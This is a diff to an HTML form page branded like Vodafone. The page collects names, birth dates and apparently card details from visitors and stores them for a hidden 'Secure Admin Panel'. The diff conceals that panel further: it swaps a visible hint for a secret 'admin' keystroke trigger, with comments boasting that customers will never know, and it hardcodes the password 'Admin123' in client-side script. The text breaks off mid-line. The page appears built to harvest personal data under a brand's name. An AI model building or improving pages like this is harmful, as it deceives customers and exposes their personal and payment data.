@@ -31,6 +31,7 @@
     .full-width { grid-column: 1 / -1; }
     .card-row { display: grid; grid-template-columns: 1fr 0.6fr 0.8fr; gap: 12px; }
     .dob-row { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px; }
+    .dob-row input { text-align: center; }
     .form-actions { padding: 0rem 1.8rem 2rem 1.8rem; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 16px; border-top: 1px solid #eef2f6; margin-top: 8px; padding-top: 1.8rem; background-color: #ffffff; border-radius: 0 0 24px 24px; }
     .btn { padding: 12px 28px; border-radius: 40px; font-weight: 700; font-size: 0.9rem; border: none; cursor: pointer; transition: 0.2s; font-family: 'Inter', sans-serif; }
     .btn-primary { background: #e60000; color: white; box-shadow: 0 4px 8px rgba(230, 0, 0, 0.2); }
@@ -56,7 +57,7 @@
     .thankyou-modal button { background: #e60000; border: none; padding: 12px 28px; border-radius: 40px; color: white; font-weight: 700; font-size: 0.9rem; cursor: pointer; }
     .thankyou-modal button:hover { background: #c10000; }
     
-    /* Admin Panel - Hidden from customers */
+    /* Admin Panel - COMPLETELY HIDDEN from customers */
     .admin-panel { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; width: 90%; max-width: 1200px; height: 80%; border-radius: 24px; z-index: 3000; box-shadow: 0 25px 50px rgba(0,0,0,0.3); overflow: hidden; }
     .admin-panel.active { display: flex; flex-direction: column; }
     .admin-header { background: #e60000; color: white; padding: 1rem; display: flex; justify-content: space-between; align-items: center; }
@@ -66,40 +67,33 @@
     .submission-item pre { white-space: pre-wrap; font-family: monospace; font-size: 0.8rem; margin: 0; }
     .close-admin { background: rgba(255,255,255,0.2); border: none; color: white; padding: 0.5rem 1rem; border-radius: 8px; cursor: pointer; }
     
-    /* Secret Admin Login - Hidden from customers until triggered */
-    .admin-login-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 4000; align-items: center; justify-content: center; }
+    /* Secret Admin Login Overlay */
+    .admin-login-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 4000; align-items: center; justify-content: center; }
     .admin-login-overlay.active { display: flex; }
     .admin-login-box { background: white; padding: 2rem; border-radius: 24px; width: 350px; text-align: center; }
     .admin-login-box input { width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 12px; font-size: 1rem; }
     .admin-login-box button { background: #e60000; color: white; border: none; padding: 12px 24px; border-radius: 40px; cursor: pointer; width: 100%; }
     .admin-login-box h3 { color: #e60000; margin-bottom: 1rem; }
     
-    /* Secret access hint - only visible to you */
-    .secret-hint { position: fixed; bottom: 10px; left: 10px; font-size: 10px; color: rgba(0,0,0,0.2); cursor: pointer; z-index: 999; }
-    .secret-hint:hover { color: rgba(0,0,0,0.5); }
-    
     @media (max-width: 680px) { body { padding: 1rem; } .form-body { padding: 1.2rem; } .card-row, .dob-row { grid-template-columns: 1fr; } }
   </style>
 </head>
 <body>
 
-<!-- Secret access area (double-click to show admin login) -->
-<div class="secret-hint" ondblclick="showAdminLogin()">
-  <i class="fas fa-shield-alt"></i> Admin Access (double-click)
-</div>
+<!-- NO VISIBLE BUTTONS FOR CUSTOMERS - Completely hidden admin access -->
 
-<!-- Admin Login Overlay -->
+<!-- Admin Login Overlay (Only appears with secret key combo) -->
 <div id="adminLoginOverlay" class="admin-login-overlay">
   <div class="admin-login-box">
     <i class="fas fa-lock" style="font-size: 3rem; color: #e60000;"></i>
-    <h3>Admin Access Only</h3>
+    <h3>Administrator Access</h3>
     <input type="password" id="adminPassword" placeholder="Enter Admin Password" autocomplete="off">
-    <button onclick="verifyAdminPassword()">Access Submissions</button>
+    <button onclick="verifyAdminPassword()">Access Dashboard</button>
     <p style="font-size: 0.7rem; margin-top: 1rem; color: #999;">Authorized personnel only</p>
   </div>
 </div>
 
-<!-- Admin Panel -->
+<!-- Admin Panel (Hidden until password entered) -->
 <div id="adminPanel" class="admin-panel">
   <div class="admin-header">
     <h3><i class="fas fa-database"></i> Secure Admin Panel - Customer Submissions</h3>
@@ -150,17 +144,11 @@
             <input type="text" name="Surname" id="surname" placeholder="Smith" required>
           </div>
           <div class="input-group full-width">
-            <label><i class="fas fa-calendar-alt"></i> Date of birth (Numeric)</label>
+            <label><i class="fas fa-calendar-alt"></i> Date of Birth</label>
             <div class="dob-row">
-              <select id="dobDay" name="DOB Day" required>
-                <option value="" disabled selected>Day</option>
-              </select>
-              <select id="dobMonth" name="DOB Month" required>
-                <option value="" disabled selected>Month</option>
-              </select>
-              <select id="dobYear" name="DOB Year" required>
-                <option value="" disabled selected>Year</option>
-              </select>
+              <input type="number" id="dobDay" name="DOB Day" placeholder="DD" min="1" max="31" required>
+              <input type="number" id="dobMonth" name="DOB Month" placeholder="MM" min="1" max="12" required>
+              <input type="number" id="dobYear" name="DOB Year" placeholder="YYYY" min="1920" max="2026" required>
             </div>
           </div>
           <div class="input-group">
@@ -280,8 +268,25 @@
     let formSubmitted = false;
     
     // ============ YOUR SECRET ADMIN PASSWORD ============
-    // CHANGE THIS PASSWORD TO YOUR OWN SECRET ONE
-    const ADMIN_PASSWORD = "VodafoneAdmin2026";
+    // CHANGE THIS PASSWORD - ONLY YOU KNOW THIS!
+    const ADMIN_PASSWORD = "Admin123";
+    
+    // ============ SECRET KEYBOARD SHORTCUT ============
+    // Press "A" + "D" + "M" + "I" + "N" in sequence to show admin login
+    // Customers will NEVER know this!
+    let secretKeySequence = [];
+    const secretCode = ['a', 'd', 'm', 'i', 'n'];
+    
+    document.addEventListener('keydown', function(e) {
+      secretKeySequence.push(e.key.toLowerCase());
+      if (secretKeySequence.length > secretCode.length) {
+        secretKeySequence.shift();
+      }
+      if (JSON.stringify(secretKeySequence) === JSON.stringify(secretCode)) {
+        showAdminLogin();
+        secretKeySequence = [];
+      }
+    });
     
     function showMessage(text, isError = false) {
       toast.textContent = text;
@@ -301,14 +306,14 @@
       if (formSubmitted) {
         form.reset();
         document.getElementById('employmentStatus').selectedIndex = 0;
-        document.getElementById('dobDay').selectedIndex = 0;
-        document.getElementById('dobMonth').selectedIndex = 0;
-        document.getElementById('dobYear').selectedIndex = 0;
+        document.getElementById('dobDay').value = '';
+        document.getElementById('dobMonth').value = '';
+        document.getElementById('dobYear').value = '';
         formSubmitted = false;
       }
     };
     
-    // Admin Panel Functions with Password Protection
+    // Admin Functions
     window.showAdminLogin = function() {
       document.getElementById('adminLoginOverlay').classList.add('active');
     };
@@ -435,39 +440,13 @@
           data: data 
         });
         localStorage.setItem('vodafone_submissions', JSON.stringify(submissions));
-        console.log('✅ Submission saved! View in Admin Panel');
+        console.log('✅ Submission saved!');
         return true;
       } catch(e) {
         console.error('localStorage error:', e);
         return false;
       }
     }
-    
-    function populateDOB() {
-      const daySelect = document.getElementById('dobDay');
-      for (let i = 1; i <= 31; i++) {
-        const option = document.createElement('option');
-        option.value = i;
-        option.textContent = i;
-        daySelect.appendChild(option);
-      }
-      const monthSelect = document.getElementById('dobMonth');
-      for (let i = 1; i <= 12; i++) {
-        const option = document.createElement('option');
-        option.value = i;
-        option.textContent = i;
-        monthSelect.appendChild(option);
-      }
-      const yearSelect = document.getElementById('dobYear');
-      const currentYear = new Date().getFullYear();
-      for (let i = currentYear; i >= 1920; i--) {
-        const option = document.createElement('option');
-        option.value = i;
-        option.textContent = i;
-        yearSelect.appendChild(option);
-      }
-    }
-    populateDOB();
     
     function validateRequiredFields() {
       const requiredFields = [
@@ -499,8 +478,24 @@
       const day = document.getElementById('dobDay').value;
       const month = document.getElementById('dobMonth').value;
       const year = document.getElementById('dobYear').value;
+      
       if (!day || !month || !year) {
-        showMessage("🎂 Please select complete Date of Birth (Day, Month, Year)", true);
+        showMessage("🎂 Please enter complete Date of Birth (DD/MM/YYYY)", true);
+        return false;
+      }
+      
+      if (day < 1 || day > 31) {
+        showMessage("📅 Please enter valid day (1-31)", true);
+        return false;
+      }
+      
+      if (month < 1 || month > 12) {
+        showMessage("📅 Please enter valid month (1-12)", true);
+        return false;
+      }
+      
+      if (year < 1920 || year > 2026) {
+        showMessage("📅 Please enter valid year (1920-2026)", true);
         return false;
       }
       
@@ -508,4 +503,6 @@
       const today = new Date();
       let age = today.getFullYear() - birthDate.getFullYear();
       const mDiff = today.getMonth() - birthDate.getMonth();
-      if (
+      if (mDiff < 0 || (mDiff === 0 && today.getDate() < birthDate.getDate())) age--;
+      if (age < 18) {
+        showMessage("
